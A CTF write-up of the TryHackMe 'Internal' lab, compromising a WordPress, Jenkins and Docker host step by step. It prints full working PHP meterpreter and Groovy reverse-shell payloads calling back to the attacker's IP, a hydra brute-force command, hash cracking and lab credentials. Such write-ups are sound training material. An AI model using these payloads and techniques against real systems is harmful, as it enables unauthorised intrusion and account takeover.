---
title: "Internal Boot2Root Write-Up"
date: 2020-12-05T00:00:00-04:00
author: "Nate Catelli"
tags: ["ctf", "boot2root", "hacking", "writeup", "tryhackme"]
description: "A boot2root writeup of the Internal host from TryHackMe"
type: "post"
draft: false
---

## Introduction:
The Internal host took me almost 24 hours to complete just due to the sheer number of hops required to complete it. Unlike many of the other boot2roots I've completed on THM, this host required review of logs and the host above and beyond the results of automated enumeration tools like linPEAS. I enjoyed this host immensely and I thought it was incredibly brilliant machine. 

## Environment
The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. Information on the host was extremely limited other than that there would be two flags available corresponding to a user and root flag. It was also known that the host contained a web application, and that the host, known by the vhost internal.thm, was the only host in scope.

## Attack 
Prior to starting the attack, I prepared my attack host by setting up burpsuite, installing the certificates in firefox and defining the scope to include only the target host. I also opened msfconsole and configured it to connect to a postgres backend of msfdb. I also went ahead and installed, `jq`, [gobuster](https://github.com/OJ/gobuster) and the awesome [seclists](https://github.com/danielmiessler/SecLists) collections. Finally I added internal.thm to my hosts file mapped to the target IP per the provide scope document.

### Host enumeration
I started the attack by running an nmap scan against the host which identified only 2 listening ports on ssh and http while also confirming that this host was running linux.

```
msf5 > db_nmap -sS -sV -O 10.10.215.86
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-05 04:12 UTC
[*] Nmap: Nmap scan report for ip-10-10-215-86.eu-west-1.compute.internal (10.10.215.86)
[*] Nmap: Host is up (0.00049s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
[*] Nmap: MAC Address: 02:92:71:78:CF:69 (Unknown)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.80%E=4%D=12/5%OT=22%CT=1%CU=34196%PV=Y%DS=1%DC=D%G=Y%M=029271%T
[*] Nmap: OS:M=5FCB08D5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I
[*] Nmap: OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
[*] Nmap: OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
[*] Nmap: OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
[*] Nmap: OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
[*] Nmap: OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
[*] Nmap: OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
[*] Nmap: OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
[*] Nmap: OS:=Y%DFI=N%T=40%CD=S)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 20.94 seconds
```

To confirm there was nothing running on hidden ports I ran a broader scan against all 65535 ports but found that it returned nothing more that the above and have omitted the results for that reason.

### Investigating the webpage
I then opened the webpage available in the browser and found that I was given the default apache page for ubuntu.

![webserver index page](/img/internal_http_index.png)

I decided to run `gobuster` with the `directory-list-2.3-medium.txt` wordlist to attempt to attempt to find anything else that could be sitting on the webserver.

```
root@kali:~/ctf# gobuster dir -u 'http://10.10.215.86' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.215.86
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/05 04:21:49 Starting gobuster
===============================================================
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/05 04:22:11 Finished
===============================================================
```

I was lucky to find what looked like two potential paths forward, a blog running wordpress and a phpmyadmin panel. I decided to take a look at the blog to start.

### Investigating the wordpress blog
The wordpress blog appeared pretty bog standard after opening the page, appearing to be not much more than a default install.

![wordpress index](/img/internal_http_blog_index.png)

I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run `wpscan` against it to see if anything significant jumped out at me. Quickly it identified that this was wordpress `5.4.2` but gave little else that was actionable for the attack.

With the defined I decided to attempt to see if there was any information that I could pull from the api endpoint before looking at other vectors.

```
root@kali:~/ctf# curl -sI http://10.10.215.86/blog/?author=1
HTTP/1.1 200 OK
Date: Sat, 05 Dec 2020 04:48:22 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <http://internal.thm/blog/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

root@kali:~/ctf# curl -s http://internal.thm/blog/index.php/wp-json/wp/v2/users | jq .
[
  {
    "id": 1,
    "name": "admin",
    "url": "http://192.168.1.45/blog",
    "description": "",
    "link": "http://internal.thm/blog/index.php/author/admin/",
    "slug": "admin",
    "avatar_urls": {
      "24": "http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=24&d=mm&r=g",
      "48": "http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=48&d=mm&r=g",
      "96": "http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://internal.thm/blog/index.php/wp-json/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "http://internal.thm/blog/index.php/wp-json/wp/v2/users"
        }
      ]
    }
  }
]
```

Luckily this gave me a username, `admin`, which I decided to start a hydra attack against while I investigated other vectors.

### Bruteforcing the admin wordpress user
I pulled the post-form fields from burpsuite and crafted a hydra attack using the `rockyou.txt` wordlist for password parameters before stepping away to pour a cup of coffee.

```
root@kali:~/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.215.86 http-post-form '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:is incorrect'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-05 05:17:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.215.86:80/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:is incorrect
[STATUS] 1934.00 tries/min, 1934 tries in 00:01h, 14342465 to do in 123:36h, 16 active
[80][http-post-form] host: 10.10.215.86   login: admin   password: my2boys
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-05 05:19:49
```

By the time I had returned I found that the bruteforce had yielded the password `my2boys` which I was able to confirm allowed me access to the admin panel.

![wordpress admin panel](/img/internal_http_wp_admin.png)

### Popping a shell through wp admin
Once I had access to the admin panel, I decided to generate a reverse meterpreter shell that could be injected into the theme.

I generated a `php/meterpreter/reverse_tcp` shell using `msfvenom` and backed up the index.php theme before replacing it with the generated shellcode.

```
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.253.137 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.253.137'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![wordpress template injection](/img/internal_http_wp_shell_injection.png)

Prior to saving the theme I prepped a listener in using the `exploit/multi/handler` in metasploit to catch the new meterpreter session.

```
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.253.137:4444
```

I then refreshed the site index and began preparing to migrate the incoming shell to a new process not attached to the php session using the `multi/manage/shell_to_meterpreter` module.

```
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (38288 bytes) to 10.10.215.86
[*] Meterpreter session 1 opened (10.10.253.137:4444 -> 10.10.215.86:58660) at 2020-12-05 05:33:03 +0000

msf5 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.253.137:4433 
[*] Sending stage (980808 bytes) to 10.10.215.86
[*] Meterpreter session 2 opened (10.10.253.137:4433 -> 10.10.215.86:55326) at 2020-12-05 05:33:23 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                           Connection
  --  ----  ----                   -----------                                                           ----------
  1         meterpreter php/linux  www-data (33) @ internal                                              10.10.253.137:4444 -> 10.10.215.86:58660 (10.10.215.86)
  2         meterpreter x86/linux  no-user @ internal (uid=33, gid=33, euid=33, egid=33) @ 10.10.215.86  10.10.253.137:4433 -> 10.10.215.86:55326 (10.10.215.86)
```

Once this completed I killed the original session, and replaced the site index with it's original template, returning the site to its normal appearance.

### Enumerating the local user.
Now that I had a shell, I started by running `linPEAS` to gain an initial impression of what else was running on the host.

```
msf5 post(multi/manage/shell_to_meterpreter) > use 2
[*] Starting interaction with 2...

meterpreter > getuid 
Server username: no-user @ internal (uid=33, gid=33, euid=33, egid=33)
meterpreter > cd /tmp/
meterpreter > upload /root/Desktop/PEASS/linPEAS/linpeas.sh
[*] uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 217.36 KiB (-0.0%): /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
meterpreter > shell 
Process 6521 created.
Channel 3 created.
chmod +x linpeas.sh
./linpeas.sh > internal_local_enum.txt
```

```
meterpreter > download internal_local_enum.txt
[*] Downloading: internal_local_enum.txt -> /root/ctf/internal_local_enum.txt
[*] Downloaded 124.65 KiB of 124.65 KiB (100.0%): internal_local_enum.txt -> /root/ctf//internal_local_enum.txt
[*] download   : internal_local_enum.txt -> /root/ctf//internal_local_enum.txt
```

I combed through the results and found that it was a linux host, specifically `Ubuntu 18.04.4`. That the host contained an additional unprivileged users with a shell, `aubreanna`, appeared to be running `docker`, appeared to be running a significant number of locally bound services and finally that the host appeared to be running jenkins as the `aubreanna` user. With the assumption being that one of these locally bound services was the jenkins portal.

```
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic
```

```
[+] Users with console
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

```
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44849         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.215.86:58660      10.10.253.137:4444      ESTABLISHED 6511/TOJWR          
tcp        0      0 10.10.215.86:55326      10.10.253.137:4433      ESTABLISHED 6511/TOJWR          
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.215.86:80         10.10.253.137:44196     ESTABLISHED -                   
tcp6       0      0 10.10.215.86:80         10.10.253.137:44286     TIME_WAIT   -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.215.86:68         0.0.0.0:*                           - 
```

```
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:d6ff:fe0f:a70e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:d6:0f:a7:0e  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 1416 (1.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
aubrean+  1506  0.0  0.0   1148     4 ?        Ss   04:08   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1540  0.5 12.1 2587808 248012 ?      Sl   04:08   0:27 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war  0.0  0.1  28332  2344 ?        Ss   04:08   0:00 /usr/sbin/atd -f
message+   909  0.0  0.2  50060  4664 ?        Ss   04:08   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyql     1099  0.2 11.2 1165848 229308 ?      Sl   04:08   0:14 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

I decided to take a look in the `/var/jenkins_home/` directory to see if I could find any configuration for the jenkins host but found that it didn't exist, giving more credence to it running in a docker container. I similarly looked under `/etc/` and found nothing related to jenkins, finally under `/opt/` I stumbled on a `/opt/wp-save.txt` file that netted a set of credentialls for the `aubreanna` user.

```
meterpreter > cd /opt
meterpreter > ls
Listing: /opt
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40711/rwx--x--x   4096  dir   2020-08-03 03:01:12 +0000  containerd
100644/rw-r--r--  138   fil   2020-08-03 02:46:25 +0000  wp-save.txt

meterpreter > cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
meterpreter >
```

I attempted to login with the provided credentials via ssh and was pleased to receive a shell which quickly netted the user flag and confirmed that jenkins was running in docker and gave me a host/port pairing.

```
root@kali:~/ctf# ssh aubreanna@10.10.215.86
The authenticity of host '10.10.215.86 (10.10.215.86)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.215.86' (ECDSA) to the list of known hosts.
aubreanna@10.10.215.86's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  5 05:44:35 UTC 2020

  System load:  0.1               Processes:              113
  Usage of /:   64.0% of 8.79GB   Users logged in:        0
  Memory usage: 48%               IP address for eth0:    10.10.215.86
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

### Connecting to jenkins
Prior to starting user enumeration, I decided to setup ssh port-forwarding so that I can easily connect back to the jenkins host that was bound to `127.0.0.1:8080` on the target host which I bound to port `8888` on my own host.

```
root@kali:~/ctf# ssh -L 8888:127.0.0.1:8080 -N -f aubreanna@10.10.215.86
aubreanna@10.10.215.86's password:
```

![jenkins login](/img/internal_http_jenkins_login.png)

### Enumerating the aubreanna user
I, again, uploaded linPEAS to the `aubreanna` users home directory and reran the scan to see if anything else turned up.

```
root@kali:~/ctf# sftp aubreanna@10.10.215.86
aubreanna@10.10.215.86's password: 

Permission denied, please try again.
aubreanna@10.10.215.86's password: 
Connected to 10.10.215.86.
sftp> put /root/Desktop/PEASS/linPEAS/linpeas.sh 
Uploading /root/Desktop/PEASS/linPEAS/linpeas.sh to /home/aubreanna/linpeas.sh
/root/Desktop/PEASS/linPEAS/linpeas.sh
```

```
aubreanna@internal:~$ ./linpeas.sh > aubreanna_local_enum.txt
```

But upon further inspection found that it confirmed a lot of information that I had already known. However, I remembered that the jenkins container was running under the same user as aubreanna and I decided to see if I could access any of the filesystem through `/proc`. I attempted to navigate to the jenkins process and found that I was able to access the root of the of the namespace where I was quickly able to leak the jenkins admin credentials.

```
aubreanna@internal:/proc/1506/root$ ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
aubreanna@internal:/proc/1506/root$ cd var/
aubreanna@internal:/proc/1506/root/var$ ls
backups  cache  jenkins_home  lib  local  lock  log  mail  opt  run  spool  tmp
aubreanna@internal:/proc/1506/root/var$ cd jenkins_home/
aubreanna@internal:/proc/1506/root/var/jenkins_home$ ls
com.cloudbees.hudson.plugins.folder.config.AbstractFolderConfiguration.xml  identity.key.enc                                jobs              queue.xml.bak             updates
config.xml                                                                  jenkins.install.InstallUtil.lastExecVersion     logs              secret.key                userContent
copy_reference_file.log                                                     jenkins.install.UpgradeWizard.state             nodeMonitors.xml  secret.key.not-so-secret  users
hudson.model.UpdateCenter.xml                                               jenkins.model.JenkinsLocationConfiguration.xml  nodes             secrets                   war
hudson.plugins.git.GitTool.xml                                              jenkins.telemetry.Correlator.xml                plugins           tini_pub.gpg              workflow-libs
```

```
aubreanna@internal:/proc/1506/root/var/jenkins_home/users$ cat admin_3190494404640478712/config.xml | grep '<id>'
  <id>admin</id>
aubreanna@internal:/proc/1506/root/var/jenkins_home/users$ cat admin_3190494404640478712/config.xml | grep 'hudson.security.HudsonPrivateSecurityRealm_-Details' -A1
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl>
```

### Cracking the Jenkins admin credentials.
I pulled the bcrypt has from above and fed it into `john`, again running it against the `rockyou.txt` wordlist to see if I could find a matching set of credentials. Almost instantaneously it returned a collision for the password `spongebob`.

```
root@kali:~/ctf# echo 'admin:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe' > jenkins_admin.txt
root@kali:~/ctf# john jenkins_admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob        (admin)
1g 0:00:00:01 DONE (2020-12-05 06:07) 0.6172g/s 66.66p/s 66.66c/s 66.66C/s spongebob..beautiful
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I validated I was was able to login with this new set of credentials.

![jenkins admin](/img/internal_http_jenkins_admin.png)

### Popping a shell in jenkins
While I had access to the jenkins filesystem, there were still some directories that I was unable to see so I decided to open a shell up into the container. With admin access, I decided to try using the groovy shell to open a session and prepared another metasploit listener to catch a shell.

```
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 5.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.253.137:4444 
```

I also prepared an example shell from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) which i pmupt into the groovy script console of jenkins.

```
String host="10.10.253.137";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![groovy shell payload](/img/internal_http_jenkins_groovy_injection.png)

Soon after executing the payload I caught ont he listener and quickly migrated it using the `shell_to_meterpreter` module. I now had an open shell as the `www-data` user as well as an open shell into the jenkins container.

```
msf5 exploit(multi/handler) > [*] Command shell session 3 opened (10.10.253.137:4444 -> 10.10.215.86:57730) at 2020-12-05 06:16:05 +0000

msf5 exploit(multi/handler) > search shell_to_me

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(multi/handler) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > set session 3
session => 3
msf5 post(multi/manage/shell_to_meterpreter) > set lport 4333
lport => 4333
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 3
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.253.137:4333 
[*] Sending stage (980808 bytes) to 10.10.215.86
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > kill sessessions -k 3
[*] Killing the following session(s): 3
[*] Killing session 3
[*] 10.10.215.86 - Command shell session 3 closed.
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                                Connection
  --  ----  ----                   -----------                                                                ----------
  2         meterpreter x86/linux  no-user @ internal (uid=33, gid=33, euid=33, egid=33) @ 10.10.215.86       10.10.253.137:4433 -> 10.10.215.86:55326 (10.10.215.86)
  4         meterpreter x86/linux  no-user @ jenkins (uid=1000, gid=1000, euid=1000, egid=1000) @ 172.17.0.2  10.10.253.137:4333 -> 10.10.215.86:38946 (172.17.0.2)
```

Given my success with the previous `/opt` directory, I blindly decided to look there first in the new shell.

```
meterpreter > ls /opt 
Listing: /opt
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  204   fil   2020-08-03 03:31:42 +0000  note.txt

meterpreter > cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Luckily this ended yielding a set of root credentials which I could have, ironically, obtained without going through all the trouble of popping another shell.

### Root shell
With the new root credentials, I decided to `su` from my aubreanna shell and quickly found the final set of root credentials.

```
aubreanna@internal:~$ su -
Password: 
root@internal:~# ls
root.txt  snap
```

## Summary
I don't think this walk through effectively captures the amount of time that I spent poking around at each level of local enumeration. In my first run through I spent a significant amount of time poking around both on the blog and within the blog's webroot as well as within the mysql database and phpmyadmin panels. However this host did teach me to never underestimate the power of a uid/gid collision.
